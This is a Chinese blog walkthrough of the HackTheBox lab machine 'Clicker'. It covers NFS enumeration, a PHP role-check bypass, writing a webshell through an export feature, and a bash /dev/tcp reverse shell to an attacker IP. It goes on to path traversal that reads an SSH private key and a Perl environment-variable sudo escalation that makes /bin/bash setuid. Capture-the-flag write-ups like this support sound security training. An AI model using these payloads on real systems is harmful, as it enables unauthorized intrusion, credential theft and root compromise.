<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[渗透测试学习] Clicker - HackTheBox - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[渗透测试学习] Clicker - HackTheBox" />
<meta property="og:description" content="文章目录 信息搜集代码审计反弹shell提权 信息搜集 nmap扫描一下端口
nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232 扫描结果
22/tcp open ssh 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) //重定向 111/tcp open rpcbind 2-4 (RPC #100000) 我们往下看发现启用了nfs协议
去网上查询下相关资料 参考文章
NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share files)。所以，你也可以简单地将它看做是一个文件服务器(file server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。
既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录
在本地创建目录mnt/nfs_file，然后读取根目录文件
sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file 注：-o：指定挂载选项，比如读写权限、访问权限等
​ nolock 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制
我们ls一下，发现zip文件
解压发现不行，用cp命令复制到本地即可
由于80端口出现重定向，那么我们添加域名到/etc/hosts
开始进行下一步
代码审计 我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php
那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方
&lt;?php session_start(); include_once(&#34;db_utils.php&#34;); if (isset($_SESSION[&#39;PLAYER&#39;]) &amp;&amp; $_SESSION[&#39;PLAYER&#39;] != &#34;&#34;) { $args = []; foreach($_GET as $key=&gt;$value) { if (strtolower($key) === &#39;role&#39;) { // prevent malicious users to modify role header(&#39;Location: /index." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/f9b786c5b91c6601e50d9b1f39935f32/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-10T20:16:27+08:00" />
<meta property="article:modified_time" content="2024-01-10T20:16:27+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[渗透测试学习] Clicker - HackTheBox</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#_9" rel="nofollow">信息搜集</a></li><li><a href="#_63" rel="nofollow">代码审计</a></li><li><a href="#shell_110" rel="nofollow">反弹shell</a></li><li><a href="#_311" rel="nofollow">提权</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<hr> 
<h3><a id="_9"></a>信息搜集</h3> 
<p>nmap扫描一下端口</p> 
<pre><code>nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232
</code></pre> 
<p><img src="https://images2.imgbox.com/93/7d/zr8cAWTs_o.png" alt="在这里插入图片描述"></p> 
<p>扫描结果</p> 
<pre><code>22/tcp    open  ssh
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向
111/tcp   open  rpcbind 2-4 (RPC #100000)
</code></pre> 
<p>我们往下看发现启用了nfs协议</p> 
<p><img src="https://images2.imgbox.com/7c/5e/57tjh3OP_o.png" alt="在这里插入图片描述"></p> 
<p>去网上查询下相关资料 <a href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0" rel="nofollow">参考文章</a></p> 
<blockquote> 
 <p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share files)。所以，你也可以简单地将它看做是一个文件服务器(file server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p> 
</blockquote> 
<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p> 
<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p> 
<pre><code>sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file
</code></pre> 
<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p> 
<p>​ <code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p> 
<p>我们ls一下，发现zip文件</p> 
<p><img src="https://images2.imgbox.com/a6/af/cu2AtKym_o.png" alt="在这里插入图片描述"></p> 
<p>解压发现不行，用cp命令复制到本地即可</p> 
<p><img src="https://images2.imgbox.com/f1/99/YJhc0qIW_o.png" alt="在这里插入图片描述"></p> 
<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p> 
<p>开始进行下一步</p> 
<h3><a id="_63"></a>代码审计</h3> 
<p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p> 
<p><img src="https://images2.imgbox.com/1a/f3/qPEd28Mk_o.png" alt="在这里插入图片描述"></p> 
<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p> 
<pre><code>&lt;?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) &amp;&amp; $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=&gt;$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');	
}
?&gt;
</code></pre> 
<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p> 
<p>这里我们搜索一下<code>$_SESSION['PLAYER']</code>是怎么来的，发现是由username决定的也就是登陆者身份</p> 
<p><img src="https://images2.imgbox.com/8b/4d/8zv0rIaQ_o.png" alt="在这里插入图片描述"></p> 
<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === 'role')</code>判断<br> 这里本地测试发现，利用换行符<code>%0a</code>就行了<br> <img src="https://images2.imgbox.com/c7/e2/43Oi04FZ_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="shell_110"></a>反弹shell</h3> 
<p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p> 
<p><img src="https://images2.imgbox.com/25/e7/Z73PnsV2_o.png" alt="在这里插入图片描述"></p> 
<p>放行，提示修改成功</p> 
<p><img src="https://images2.imgbox.com/8a/cd/pSl56QR2_o.png" alt="在这里插入图片描述"></p> 
<p>然后退出重新登录，发现多了一个功能</p> 
<p><img src="https://images2.imgbox.com/2a/c4/DQKD4xcT_o.png" alt="在这里插入图片描述"></p> 
<p>点进去看看发现有四个用户</p> 
<p>有个导出表格export选项，点击得到保存的路径</p> 
<p><img src="https://images2.imgbox.com/9c/68/7uFOgX0q_o.png" alt="在这里插入图片描述"></p> 
<p>访问一下</p> 
<p><img src="https://images2.imgbox.com/86/07/3rBB4OUo_o.png" alt="在这里插入图片描述"></p> 
<p>我们抓包看看保存的过程发现拓展名可控</p> 
<p>尝试修改为php成功</p> 
<p><img src="https://images2.imgbox.com/11/45/uoW1JhI8_o.png" alt="在这里插入图片描述"></p> 
<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p> 
<p>点击play，然后save的时候抓包</p> 
<p>（注意<code>?</code>要url编码一下）</p> 
<p><img src="https://images2.imgbox.com/fb/14/lkqLRU6n_o.png" alt="在这里插入图片描述"></p> 
<p>然后还是一样回显保存成功，那么说明成功写入马</p> 
<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p> 
<p><img src="https://images2.imgbox.com/78/55/VMZSdI5F_o.png" alt="在这里插入图片描述"></p> 
<p>我们将反弹shell命令url编码一下，然后执行</p> 
<pre><code>?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22
</code></pre> 
<p>成功反弹shell</p> 
<p><img src="https://images2.imgbox.com/65/60/IS9QuUJZ_o.png" alt="在这里插入图片描述"></p> 
<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p> 
<p><img src="https://images2.imgbox.com/44/c5/Tw7dTMk5_o.png" alt="在这里插入图片描述"></p> 
<p>貌似是二进制文件execute_query的使用说明</p> 
<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p> 
<p><img src="https://images2.imgbox.com/4c/7c/z4A5lQ57_o.png" alt="在这里插入图片描述"></p> 
<p>然后丢到ida里F5反编译</p> 
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  size_t v4; // rbx
  size_t v5; // rax
  size_t v6; // rbx
  size_t v7; // rax
  int v8; // [rsp+10h] [rbp-B0h]
  char *dest; // [rsp+18h] [rbp-A8h]
  char *name; // [rsp+20h] [rbp-A0h]
  char *command; // [rsp+28h] [rbp-98h]
  char s[32]; // [rsp+30h] [rbp-90h] BYREF
  char src[88]; // [rsp+50h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  if ( argc &gt; 1 )
  {
    v8 = atoi(argv[1]);
    dest = (char *)calloc(0x14uLL, 1uLL);
    switch ( v8 )
    {
      case 0:
        puts("ERROR: Invalid arguments");
        return 2;
      case 1:
        strncpy(dest, "create.sql", 0x14uLL);
        goto LABEL_10;
      case 2:
        strncpy(dest, "populate.sql", 0x14uLL);
        goto LABEL_10;
      case 3:
        strncpy(dest, "reset_password.sql", 0x14uLL);
        goto LABEL_10;
      case 4:
        strncpy(dest, "clean.sql", 0x14uLL);
        goto LABEL_10;
      default:
        strncpy(dest, argv[2], 0x14uLL);
LABEL_10:
        strcpy(s, "/home/jack/queries/");
        v4 = strlen(s);
        v5 = strlen(dest);
        name = (char *)calloc(v4 + v5 + 1, 1uLL);
        strcat(name, s);
        strcat(name, dest);
        setreuid(0x3E8u, 0x3E8u);
        if ( access(name, 4) )
        {
          puts("File not readable or not found");
        }
        else
        {
          strcpy(src, "/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; ");
          v6 = strlen(src);
          v7 = strlen(dest);
          command = (char *)calloc(v6 + v7 + 1, 1uLL);
          strcat(command, src);
          strcat(command, name);
          system(command);
        }
        result = 0;
        break;
    }
  }
  else
  {
    puts("ERROR: not enough arguments");
    return 1;
  }
  return result;
}
</code></pre> 
<p>然后就卡住了，于是参考下国外师傅写的<a href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee" rel="nofollow">wp</a>是去读取了jack的id_rsa私钥</p> 
<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p> 
<pre><code>default:
    strncpy(dest, argv[2], 0x14uLL);
</code></pre> 
<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p> 
<p>payload如下</p> 
<pre><code>./execute_query 5 ../.ssh/id_rsa
</code></pre> 
<p>成功读取</p> 
<p><img src="https://images2.imgbox.com/37/51/zZoddoY8_o.png" alt="在这里插入图片描述"></p> 
<p>将这一长串保存下来命名为id_rsa</p> 
<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p> 
<pre><code>chmod 600 id_rsa
</code></pre> 
<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p> 
<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAAB...
-----END OPENSSH PRIVATE KEY-----
</code></pre> 
<p>直接ssh连接，得到user的flag</p> 
<pre><code>ssh -i id_rsa jack@10.10.11.232
</code></pre> 
<p><img src="https://images2.imgbox.com/80/a9/2iiuLcbN_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_311"></a>提权</h3> 
<p>我们sudo发现有monitor.sh，然后cat看下具体内容</p> 
<p><img src="https://images2.imgbox.com/ff/c6/nrQHD7RA_o.png" alt="在这里插入图片描述"></p> 
<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p> 
<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p> 
<p><img src="https://images2.imgbox.com/c7/57/qIJTuYnC_o.png" alt="在这里插入图片描述"></p> 
<p>通过搜索得知一种名为perl_startup的提权方式 <a href="https://www.exploit-db.com/exploits/39702" rel="nofollow">参考文章</a></p> 
<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p> 
<pre><code>sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
//u+s表示给user用户添加权限，即/bin/bash
</code></pre> 
<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p> 
<p>得到root的flag</p> 
<p><img src="https://images2.imgbox.com/ad/56/rXolYmp4_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/70601026b4aea5ceda68382759c0f9fe/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">软件测试|好用的pycharm插件推荐（二）—— JSON Parser</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2ce9f8b5c4d27691b69b924ec8afdffe/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Pycharm远程连接服务器并运行代码（详细！）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>